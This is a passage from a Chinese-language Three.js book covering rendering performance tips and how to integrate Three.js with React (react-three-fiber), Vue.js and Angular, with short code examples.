> 注：目前 Three.js 的色彩管理尚未完全完善，因此我说的是“近乎”准确。希望这个问题能尽快修复。在此之前，任何色彩偏差都非常细微，除非你从事科学可视化或医疗成像等高精度领域，否则几乎无人能察觉。

------

### JavaScript 性能提示

现代浏览器中的 JavaScript 引擎更新频繁，并在幕后对代码进行了大量优化。因此：

- **永远以实测为准，不要凭直觉判断性能**。
- 不要轻信几年前的文章声称“应避免使用 `array.map` 或 `array.forEach`”——这些说法可能已过时。
- 亲自测试，或查阅近几个月内包含严谨基准测试的最新资料。

------

### 使用 Linter 和代码风格指南

我个人在项目中结合使用 **ESLint**、**Prettier** 和 **Airbnb 代码风格指南**。按照这篇指南（第二部分）在 VS Code 中配置仅花了我约 30 分钟，从此再也不用操心代码格式、语法检查，也不必纠结某种写法是否合理。

不过，许多 Three.js 开发者更偏爱 **Mr.doob 的代码风格**（Mr. doob’s Code Style™）。如果你也倾向于此，只需安装 `eslint-config-mdcs` 替代 `eslint-config-airbnb` 即可。

## 模型、网格与可见对象

在交付 3D 资源时，**避免使用基于文本的 3D 数据格式**（如 Wavefront OBJ 或 COLLADA），而应优先采用对 Web 友好的格式，例如 **glTF**。

- 使用 glTF 时，建议启用 **Draco 网格压缩**。这有时可将 glTF 文件体积压缩至原始大小的 10% 以下！
- 另一个新兴工具 **gltfpack** 在某些情况下甚至能提供比 Draco 更优的压缩效果，值得尝试。

如果你需要频繁地批量显示或隐藏大量对象（或将它们整体添加/移出场景），可以考虑使用 **Three.js 的图层**（Layers）功能，以提升性能和管理效率。

------

### 相机（Camera）

​		为提升渲染性能，应尽可能**缩小视锥体**（frustum）。开发阶段使用较大的视锥体是可以接受的，但在发布应用前，请将其调整到最小必要范围，以节省宝贵的每秒帧数（FPS）。

​		为避免画面闪烁，务必确保**远裁剪平面**（far clipping plane） 设置合理——尤其是当远裁剪平面距离非常大时。

------

### 渲染器（Renderer）

在创建渲染器时，可根据实际需求关闭不必要的缓冲区以优化性能：

- 如果不需要 `preserveDrawingBuffer`，请禁用它。
- 如果不需要透明通道（alpha buffer），请关闭它。
- 如果不需要模板缓冲（stencil buffer），请禁用它。
- 如果不需要深度缓冲（depth buffer），也可关闭（但大多数场景都需要深度测试，因此通常应保留）。

此外：

- 创建渲染器时，设置 `powerPreference: "high-performance"`。在多 GPU 系统中，这有助于引导系统选择高性能 GPU。
- **仅在必要时渲染**：例如，当相机位置变化超过某个微小阈值（epsilon），或存在动画时才调用渲染。
- 如果你的场景是静态的，并使用了 `OrbitControls`，可以通过监听其 `"change"` 事件来实现按需渲染：

```javascript
orbitControls.addEventListener("change", () => {
    renderer.render(scene, camera);
});
```

这样可避免不必要的重复渲染，显著提升性能。

### 灯光（Lights）

​		聚光灯（SpotLight）、点光源（PointLight）、矩形面光源（RectAreaLight）和方向光（DirectionalLight）均属于直射光。在场景中，请尽可能少地使用直射光。

​		若你向场景中添加或移除光源，WebGL 渲染器将不得不重新编译所有着色器程序（不过它会缓存这些程序，因此后续执行该操作时，速度会比第一次更快）。可以改用设置 `light = false` 或 `light.visible = 0` 的方式来替代添加 / 移除光源，同时也可调整光源的强度（intensity）。

### 启用渲染器

`physicallyCorrectLights` 是一套基于国际单位制（SI）的光源配置，可实现精准光照效果。


### 阴影（Shadows）

如果你的场景为静态场景，不必逐帧更新阴影贴图，只需在场景内容发生变化时再进行更新。

若要可视化阴影相机的视锥体，可使用 CameraHelper 工具。

尽可能缩小阴影视锥体的范围。 

尽可能降低阴影纹理的分辨率。

要注意，点光源阴影的性能开销高于其他类型的阴影，因为它需要从六个方向分别渲染一次，而平行光和聚光灯阴影仅需渲染一次。

说到点光源阴影，还需注意一点：使用 CameraHelper 显示点光源阴影时，该工具仅能呈现六个阴影方向中的一个。它依旧具有实用价值，但要查看另外五个方向的阴影，就需要你灵活变通了。 


### 材质（Materials）

- `MeshLambertMaterial` **不适用于有光泽的材质**，但它非常适合表现织物等**哑光表面**，且性能优于 `MeshPhongMaterial`。
- 如果你使用了**形变目标**（morph targets），务必在材质中设置 `morphTargets: true`，否则形变不会生效。
- 同样，若使用了**形变法线**（morph normals），也需设置 `morphNormals: true`。
- 如果你正在使用 `SkinnedMesh` 制作骨骼动画，请确保材质配置正确，并启用了 `skinning: true`。

> ⚠️ **重要提示**：
> 使用了 morph targets、morph normals 或 skinning 的网格**不能共享材质**。每个带有形变或骨骼动画的网格都必须拥有**独立的材质实例**。此时，`material.clone()` 是你的得力助手。

## 自定义材质（Custom Materials）

**不要每帧都更新 uniform 变量**，仅在它们实际发生变化时才更新。


### 几何体（Geometry）

应避免使用 `LineLoop`，因为它必须通过 `LineStrip` 模拟实现，效率较低。


### 纹理（Textures）

所有纹理尺寸**必须是 2 的幂**（Power-of-Two, POT）：如 1、2、4、8、16、…、512、1024、2048 等。

**不要修改已有纹理的尺寸**。如果需要不同尺寸，请直接创建新纹理——这样做反而更快。

尽可能使用**最小可行的纹理尺寸**（例如，能否用 256×256 的平铺纹理代替更大的？你可能会惊喜地发现效果完全足够！）。

对于非2的幂次方（NPOT）纹理，必须采用线性过滤或最近邻过滤，同时搭配边界钳位或边缘钳位的纹理环绕方式。重复环绕和多级渐远纹理过滤均不被支持。但说实话，尽量避免使用非2的幂次方纹理。

所有尺寸相同的纹理占用的内存空间都是一样的。JPG格式的文件体积可能比PNG更小，但二者占用的图形处理器内存大小是相同的。


### 抗锯齿（Anti-Aliasing）

由大量彼此平行的细长直截面构成的几何体，是抗锯齿处理的最糟情况。金属百叶窗或格子围栏就是这类例子。在场景中应尽可能避免使用此类几何体。如果别无选择，可尝试用纹理贴图替代格子结构，这样或许能获得更好的效果。

### 后期处理（Postprocessing）

启用后处理时，内置抗锯齿功能将失效（至少在 WebGL 1 环境下是如此）。你需要手动使用快速近似抗锯齿（FXAA）或增强型子像素抗锯齿（SMAA）来实现抗锯齿效果，后者的性能与效果通常更优。

由于你并未使用内置抗锯齿功能，请确保将其关闭！

Three.js 内置了大量的后处理着色器，这一点非常好用！但要注意，每个处理通道都需要对整个场景进行一次渲染。测试完成后，建议你将多个测试通道合并为一个自定义通道。这种做法虽然需要多花一些功夫，但能显著提升性能表现。

## 你是否打算从场景中移除某些内容？

首先，务必三思而后行，尤其是在你之后还打算重新显示该对象的情况下。你可以通过以下方式临时隐藏对象：使用 `object.visible = false`（对光照也有效）；  或将材质的 `opacity` 设为 0。此外，你可以通过控制光源来优化性能：若要禁用某个光源而**避免触发着色器重新编译**，应将其 `intensity`（强度）设为 0，而不是直接移除或禁用光源对象。

如果你确实需要**永久性地从场景中移除对象**，请务必先阅读这篇文章：《[如何正确释放对象](How to Dispose of Objects)》（How to Dispose of Objects）。

## 性能优化中的对象设置

对于**静态或极少移动的对象**，应设置 `matrixAutoUpdate = false`，并在其位置（position）、旋转（rotation）、四元数（quaternion）或缩放（scale）发生改变时，**显式调用 `object.updateMatrix()`**。这样可避免每帧自动计算矩阵，提升性能。

**透明物体**（transparent items） 渲染开销较大。在场景中应尽可能减少使用半透明物体。

如果可行，优先使用 **Alpha 裁剪**（alpha testing / alphabets，即通过 alpha 贴图进行裁剪）而非普通的透明混合（alpha blending），因为前者渲染速度更快。

在分析应用程序性能时，首先要确认的一点是：你的应用是受 **CPU 限制** 还是 **GPU 限制**。你可以通过将场景（scene）中的所有材质临时替换为最基础的材质（basic materials）来进行判断——具体做法是使用 `materialOverride`（参见初学者技巧及本页开头部分）。 如果替换后应用的运行速度明显提升，说明你的应用是 **GPU 受限**（GPU bound）；  如果性能没有改善，则说明瓶颈在于 **CPU**，即应用是 **CPU 受限**（CPU bound）。

在高性能 PC 上进行性能测试时，通常会因垂直同步（VSync）限制而卡在 60 FPS。若需解除此限制以测试真实性能，可在 macOS 上通过以下命令启动 Chrome：

```bash
open -a "Google Chrome" --args --disable-gpu-vsync
```

现代移动设备的像素比（pixel ratio）可高达 5；建议将这些设备上的最大像素比限制为 2 或 3。这样做虽然会使场景略微模糊，但能显著提升性能。

通过烘焙光照和阴影贴图，减少场景中的光源数量。

密切关注场景中的绘制调用（draw calls）数量。通常来说，**绘制调用越少，性能越好**，这是一个实用的经验法则。

远离摄像机的物体不需要与近处物体相同级别的细节信息。有许多技术可以通过降低远处物体的质量来提升性能。可以考虑使用**多层次细节**（Level of Detail, LOD）对象。对于远处的物体，你甚至可以每隔两到三帧才更新其位置或动画，或者直接用**公告牌**（billboard）——即该物体的二维图像表示——来替代三维模型，从而显著优化性能。

### 高级技巧

`TriangleFanDrawMode`（三角扇绘制模式）性能非常低下，应尽量避免使用。当你有**数百甚至数千个相似的几何体**时，请使用**几何体实例化**（geometry instancing），以大幅提升渲染效率。尽可能将**顶点和粒子的动画计算移到 GPU 上进行**，而不是在 CPU 上处理，这样可以显著提高性能并减轻 CPU 负担。

## 总结

在本章中，我们学习了如何以正确且精确的方式编写代码。同时，我们也了解了在编码过程中如何保障安全性，以避免任何信息泄露。最后，我们总结了一些在使用 Three.js 编写代码时应牢记的通用技巧与注意事项。

## NOTES

1. Threejsfundamentals-threejsfundamentals.org.
2. Three.js Rendering on https://threejsfundamentals.org/threejs/lessons/fr/threejs-rendering-on-demand.html.

# 第6章 总结

**本章内容**

- React 与 Three.js  
- Angular 与 Three.js  
- Vue.js 与 Three.js

在上一章中，我们学习了如何优化代码以及如何在编写代码时保障安全性。此外，我们还探讨了使用 Three.js 编写代码时的一些通用技巧与注意事项。

## 使用 Three.js 的职业前景

如今的互联网与几年前已大不相同。或许有些人还记得，早期的网站往往只是一组非响应式的、主要基于表格布局的页面，颜色也仅限于黑、白或灰。这些网站谈不上“美观”，但在当时却堪称“革命性”——因为它们的核心价值在于**完成任务**。试想一下：一个平台、一个网络应用，只要拥有一台电脑和互联网连接，地球上几乎任何地方的人都能访问它。这难道不是一件了不起的事情吗？在那个时代，人们并不在乎它看起来如何；真正重要的是它能作为**全球信息载体**，简单易用且以内容为核心。这些网站被用来教学、推广，或仅仅是将传统业务带入互联网。

Three.js 是一个广为人知的跨浏览器 JavaScript 库和应用程序接口（API），用于在网页浏览器中创建并展示动画与 3D 图形。该工具在游戏开发者群体中尤为流行，因此对于那些热衷于开发**创新型游戏**的软件开发者而言，Three.js 提供了极具潜力的职业发展方向。

目前，已有**超过 100 家公司**在其技术栈中使用了 Three.js。

## 将 Three.js 与其他框架和库结合使用

在之前的章节中，我们学习了如何在一个仅包含三个文件的简单网页中使用 Three.js：`index.html`、`src/main.js` 和 `styles/main.css`。我们一直采用这种简洁的配置来演示前几章中开发的应用程序。

然而，在现实开发环境中，像这样直接编写纯 HTML 页面的做法正变得越来越少见。近年来，Web 开发生态蓬勃发展，涌现出大量用于构建 Web 应用的库和框架，例如 React、Angular 和 Vue.js，而且新的工具还在不断出现。

这些框架各有鲜明的设计理念和编程范式，有些还引入了 JavaScript 的扩展语法（如 JSX）。这甚至还未包括像 TypeScript 这样构建在 JavaScript 之上的全新语言。

正如本书此前所强调的目标：**我们要展示如何构建一个真实世界中专业级的 Three.js 应用程序**。在一个由框架主导的开发世界里，如果只在简单的静态页面上展示我们的作品，似乎与这一目标相悖。幸运的是，实际情况并非如此——因为 **Three.js 场景始终渲染在一个单独的 HTML `<canvas>` 元素内**。

你可以直接在 HTML 中创建这个 canvas：

```html
<canvas id="scene"></canvas>
```

也可以使用你偏爱的前端框架（如 React、Vue.js、Svelte，甚至自定义框架）来创建该 canvas，然后将其传递给 Three.js。

大多数现代 Web 框架都采用组件化架构，将应用拆分为多个独立、可复用的模块。例如，一个联系表单、一个下拉菜单或一个图片画廊，都可以是 React 中的一个组件。

同样地，我们也将 Three.js 应用组织成一个单一的顶层组件，称为 **`World`**，它负责在 `<canvas>` 元素内部构建完整的 Three.js 场景。随后，只需将这个 `World` 组件嵌入到不同框架的组件系统中即可：在 React 中，将其包装在一个 React 组件内；在 Vue.js 中，封装进一个 Vue 组件；在 Angular 中，嵌入到一个 Angular 组件中；以此类推。

通过这种方式，Three.js 能够无缝集成到任何现代前端框架中，既保持其核心功能的完整性，又充分利用各框架的工程化优势。

## React 与 Three.js 简介

今天，我们将学习如何使用 **react-three-fiber** 在 React 和 React Native 应用中搭建并展示 3D 模型与动画。本课程面向希望深入了解如何在 Web 上通过 React 实现 3D 模型动画的开发者，也适用于那些在使用原生 Three.js 时遇到困难的人——例如无法创建 canvas、无法绑定点击等用户事件，或难以启动渲染循环等问题。为了更好地理解如何借助 **react-three-fiber** 构建 Three.js 3D 模型，我们将动手创建一个具体的 3D 模型示例。Three.js 是一个强大的工具库，它简化了在网页中创建 3D 图形的过程。它基于 **HTML `<canvas>` 元素和 WebGL** 技术来渲染和展示 3D 模型与动画，如上图所示。

## 开始使用 React-Three-Fiber

React-three-fiber 是一个面向 Web 和 React Native 的 Three.js 渲染器，它能显著加速基于 Three.js 的 3D 模型和动画的开发。你可以在[此处](https://github.com/pmndrs/react-three-fiber#examples)找到一些使用该技术构建的、包含 3D 模型与动画的网站示例。

React-three-fiber 通过**可复用的组件**、**便捷的事件绑定**以及**自动管理的渲染循环**，有效减少了动画开发所需的时间和复杂度。

但首先，必须先安装并引入 **Three.js**。

React-three-fiber 允许我们使用 React 的 **状态**（state） 来构建 Three.js 场景中的各个组件，使 3D 开发更符合 React 的声明式编程范式。

它还内置了以下功能元素：

## 材质管理（Material Management）

物体的外观由其**材质**（material）决定。在这里可以定义纹理、颜色和透明度等属性。在本例中，我们仅设置一个纹理。Three.js 提供了多种材质类型可供选择，它们之间的**根本区别在于对光线的反应方式不同**。

- **`MeshBasicMaterial`** 是最基础的材质。它完全不受光照影响，物体每个面都会呈现相同的颜色。然而，由于无法体现立体感（例如看不到立方体的边缘），它可能不是最佳选择。
- **`MeshLambertMaterial`** 是最简单的受光照影响的材质。它会根据光照计算每个顶点（大致对应每个面）的颜色，但不会进行更精细的光照处理（如高光）。

------

### 放置网格对象（以立方体为例）

我们可以将网格对象（此处为立方体）放置在场景中的特定位置，并围绕各个轴进行旋转。如果后续需要在 3D 空间中制作动画，通常会动态修改这些位置和旋转值。

- **位置**（position）：使用与设置尺寸相同的单位体系。数值大小本身无关紧要，关键是在你自己的“虚拟世界”中保持一致性。
- **旋转**（rotation）：使用**弧度**（radians）作为单位。如果你的原始数据是角度（degrees），需先将其除以 180，再乘以 π（即 `radians = degrees * Math.PI / 180`）。

现在，我们可以使用上述方法编写代码，最终效果将显示在页面上。

### 使用 Vue.js 与 Three.js，你可以创建令人惊叹的场景

目前已有多个用于在 Vue 中结合 Three.js 创建 3D 场景的库，例如：

- **vue-threejs**  
- **vue-gl**

这些库非常适合构建小型场景，因为它们能轻松实现基础的 3D 内容（甚至包括物理效果）。  

然而，面对更复杂的项目时，我们往往需要对某些方面拥有更精细的控制权，例如：

- 资源（asset）与场景（scene）管理  
- 基于 THREE 的内容创作流程

而这正是 **vue-threejs-composer**（或类似高级集成方案）能帮助我们实现的目标——它让上述需求变得前所未有的简单高效。

### 功能特点

本套件**不包含**基础几何体、材质以及其他更复杂的内置对象。

它仅提供一个**可轻松扩展的基础框架**，并内置了一些实用功能，旨在帮助用户规避在常规 Three.js 项目中常见的问题，包括：

- 内置的**资源与场景管理器**（Asset and Scene Manager）  
- **3D 模型加载与实例化辅助工具**  
- 支持使用原生 **Three.js 代码创建自定义内容和组件**

接下来，让我们通过一些示例来具体了解这些功能。

### 创建声明式场景

与前文提到的其他库类似，该库也提供了一些基础组件，可用于构建你自己的自定义组件。

```html
<three>
  <renderer 
    :canvas="canvas" 
    scene="scene1" 
    camera="main" 
    antialias 
    shadows
  />
  <!-- 引入资源包或其他场景 -->
  ...
  <scene name="scene1" assets="Water">
    <camera name="main" :factory="cameraFactory">
      <position :value="scene1.camera.position"/>
      <rotation :value="scene1.camera.rotation" rad/>
    </camera>

    <light name="sun" :factory="lightFactory">
      <position :value="{x: -5, y: 10, z: -5}"/>
      <shadows cast/>
    </light>

    <mesh geometry="plane" material="water_M">
      <rotation :value="{ x: -90, y: 0, z: 0 }"/>
      <shadows receive/>
    </mesh>

    <group>
      <position :value="{ x: 10, y: 3, z: 10 }"/>
      <scale :value="{ x: 0.01, y: 0.01, z: 0.01 }"/>
      ...
    </group>
  </scene>
  ...
</three>
```

在这个声明式结构中：

- `<three>` 是根组件，用于初始化 Three.js 渲染环境；
- `<renderer>` 配置渲染器，关联 canvas、场景和相机，并启用抗锯齿（antialias）和阴影（shadows）；
- `<scene>` 定义一个命名场景（如 `scene1`），并可加载指定资源（如 `Water`）；
- 相机（`<camera>`）、灯光（`<light>`）、网格（`<mesh>`）和组（`<group>`）等元素均以声明方式配置其位置、旋转、缩放及行为；
- 属性如 `:value` 支持响应式数据绑定，`rad` 表示旋转值使用弧度；
- 通过 `:factory` 可注入自定义的相机或灯光工厂函数，实现更灵活的控制。

这种声明式语法让 Three.js 场景的构建更贴近 Vue 的开发范式，提升可读性与维护性。

### 组织你的资源

通过**资源包**（Asset Bundles），你可以更高效地管理各类资源。场景在加载时会指定所需的资源包，并自动等待所有预加载的资源就绪。这样一来，你就能将精力集中在应用程序中更重要的逻辑部分。

```html
...
<asset-bundle name="Forms">
  <geometry name="cube" :factory="cubeFactory"/>
  <geometry name="plane" :factory="planeFactory"/>
</asset-bundle>

<asset-bundle dependencies="Forms" name="Water" preload>
  <standard-material name="waterMat" color="#9c9cff"/>
</asset-bundle>

<scene 
  name="scene1" 
  assets="Water" 
  @load="..." 
  @load-progress="..." 
  @loaded="..."
/>
...
```

说明：

- `<asset-bundle>` 用于定义一组相关资源（如几何体、材质等）；
- `dependencies="Forms"` 表示 “Water” 资源包依赖于 “Forms” 包，确保加载顺序正确；
- `preload` 属性表示该资源包应在场景使用前预先加载；
- `<scene>` 组件通过 `assets="Water"` 声明它需要加载 “Water” 资源包；
- 同时支持 `@load`、`@load-progress` 和 `@loaded` 等事件，便于监听资源加载状态并执行相应逻辑。

这种结构化的资源管理方式，显著提升了大型 Three.js 项目的可维护性与加载效率。

### 模型（Models）

你是否经常觉得加载 3D 模型很困难？这个库也提供了一种简单的方法，用于将材质等资源关联到这类模型资产上。

```html
<asset-bundle name="PM" preload>
  <texture name="PM_Tex" src="/assets/textures/PM_Texture_01.png"/>
  <standard-material name="PM_Mat" map="PM_Tex"/>
  <model name="PM_column" src="/assets/models/PM_Column.fbx" materials="PM_Mat"/>
  <model name="PM_column_top" src="/assets/models/PM_Column_Top.fbx" materials="PM_Mat"/>
</asset-bundle>

<scene name="scene1" assets="PM">
  <group>
    <position :value="{ x: 10, y: 3, z: 10 }"/>
    <scale :value="{ x: 0.01, y: 0.01, z: 0.01 }"/>
    <shadows cast receive/>
    <mesh model="PM_column">
      <shadows cast receive deep/>
    </mesh>
    <mesh model="PM_column_top">
      <shadows cast receive deep/>
    </mesh>
  </group>
</scene>
```

需要注意的是，该库**默认不包含任何模型加载器**。你必须先安装所需格式的加载器（例如 FBX 加载器），然后在 `Loader` 类中注册对应的扩展：

```javascript
import FbxLoader from "...";
import { Loader } from "vue-threejs-composer";

// 告诉模型加载器：遇到 .fbx 文件时使用 FBXLoader
Loader.registerExtension("fbx", FbxLoader);
```

通过这种方式，你可以灵活支持多种 3D 模型格式（如 `.fbx`、`.glb`、`.obj` 等），并将其无缝集成到声明式的 Vue + Three.js 场景中。

### 开发自定义内容

大多数组件都支持直接集成或可通过扩展，让用户轻松地将自己的 Three.js 代码嵌入到组件中。

例如，你可以创建一个工厂函数来生成自定义几何体：

```ts
// 创建工厂函数，之后即可在组件中使用
import * as THREE from "three";
import { Application, GeometryFactory } from "vue-threejs-composer";

export const cubeFactory: GeometryFactory = async (app: Application) => {
  return new THREE.BoxBufferGeometry(1, 1, 1);
};
```

## 总结

在本章中，我们探讨了学习 Three.js 的未来发展前景。同时，我们也学习了如何将其他前端框架与 Three.js 相结合，从而提升任意 Web 应用程序的质量与表现力。

## NOTES

1. A Dive Into React And Three.js Using react-three-fibre-Fortune Ikechi,Smash Magazine.
2. Hello ███ Cube: THREE.js Scene in Angular-Anurag Srivastava, Geek Culture.

## REFERENCES

  Using Three.js with React, Vue.js, Angular, Svelte ... – Discover Three.js, https://discoverthreejs.com/book/introduction/threejs-with-frameworks/
    A Dive into React and Three.js Using `react-three-fiber`– Smashing Magazine,https://www.smashingmagazine.com/2020/11/threejs-react-three-fiber/.